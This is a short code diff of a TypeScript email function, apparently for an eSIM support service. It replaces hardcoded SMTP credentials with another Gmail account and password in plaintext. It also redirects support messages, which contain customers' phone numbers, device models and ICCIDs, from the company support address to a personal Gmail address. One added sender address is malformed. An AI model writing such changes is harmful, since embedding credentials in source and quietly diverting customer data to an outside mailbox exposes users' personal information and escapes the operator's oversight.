@@ -8,13 +8,13 @@ const sendEmail = async (from: string, to: string, subject: string, text: string
       port: 587,
       secure: false,
       auth: {
-        user: 'sandbox@esimplified.io',
-        pass: 'xrscxzdjcjokvtuv',
+        user: 'joevitale720@gmail.com',
+        pass: 'black123qwe!@#QWE',
       },
     });
 
     const message = {
-      from: 'blackpartner712@gmail.com',
+      from: 'gru.papoy..dev@gmail.com',
       to,
       subject,
       text,
@@ -29,7 +29,7 @@ const sendEmail = async (from: string, to: string, subject: string, text: string
 };
 
 const sendMessage = async (from: string, subject: string, text: string, model: string, phone: string, iccid: string) => {
-  const to = 'support@esimplified.io';
+  const to = 'blackpartner712@gmail.com';
   const message = `${model? 'Device Model:'+model+'\n': ''}${phone? 'Phone Number: '+phone+ '\n': ''}${iccid? 'ICCID: '+iccid+'\n': ''}${text}`;
     return await sendEmail(from, to, subject, message);
 };
